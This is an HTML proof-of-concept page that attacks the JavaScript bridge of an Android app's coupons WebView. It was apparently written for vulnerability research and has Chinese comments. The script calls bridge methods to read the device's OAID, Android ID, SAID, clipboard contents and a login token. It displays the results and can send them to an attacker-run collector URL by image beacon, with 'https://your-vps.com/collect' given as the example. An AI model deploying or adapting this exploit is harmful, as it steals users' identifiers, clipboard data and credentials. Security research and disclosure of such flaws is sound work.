<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>poc</title>
<style>
body { background:#fff; color:#111; font-family:monospace; padding:12px; }
#log { white-space:pre-wrap; word-break:break-all; font-size:13px; line-height:1.5; }
.ok { color:#0a0; } .no { color:#a00; }
</style>
</head>
<body>
<h3>SReminder CouponsWebview JS-Bridge PoC</h3>
<div id="log">loading...</div>
<script>
/* ============ 收集端(可选,能看 access log 的服务器) ============
   不需要远端收集时把 COLLECTOR 留空字符串即可,只在界面显示 */
var COLLECTOR = "";   // 例: "https://your-vps.com/collect"

var logEl = document.getElementById("log");
var lines = [];
function show(tag, val) {
  var s = "[" + tag + "] " + val;
  lines.push(s);
  logEl.innerHTML = lines.join("\n") + "\n\n" + (lines.length > 1 ? "" : "");
}
function beacon(p) {
  try { if (COLLECTOR) new Image().src = COLLECTOR + "?d=" + encodeURIComponent(p); } catch (e) {}
}
function report(tag, val) { show(tag, val); beacon(tag + "=" + val); }
function probe(name, fn) {
  try { report(name, fn()); } catch (e) { show(name, "EXCEPTION: " + e.message); }
}

/* getToken 回调:先定义,再调用 */
window.tokcb = function (t) {
  report("cp_token(fanli)", t === null || t === "null" ? "(获取失败/未登录)" : t);
};

show("status", "页面已加载, UA=" + navigator.userAgent);
report("page_loaded", "ua=" + navigator.userAgent);

setTimeout(function () {
  probe("getClientInfo", function () { return CouponsInterface.getClientInfo(); });
  probe("getOAID", function () { return SebHandlerInterface.getOAID(); });
  probe("getAndroidId", function () { return CouponsInterface.getAndroidId() || "(空:B门禁,host不在白名单)"; });
  probe("getSAID", function () { return CouponsInterface.getSAID() || "(空:需security host+B门禁)"; });
  probe("getClipBoardString", function () { return CouponsInterface.getClipBoardString() || "(空:购物助手功能未开)"; });
  probe("isShoppingAssistantOn", function () { return CouponsInterface.isShoppingAssistantOn(); });
  probe("getReverseId", function () { return CouponsInterface.getReverseId(); });
  try {
    report("getToken_call", "fanli,回调=tokcb");
    CouponsInterface.getToken("fanli", "tokcb");
  } catch (e) { show("getToken", "EXCEPTION: " + e.message); }
}, 600);

setTimeout(function () { report("page_done", "所有探测完成"); }, 20000);
</script>
</body>
</html>
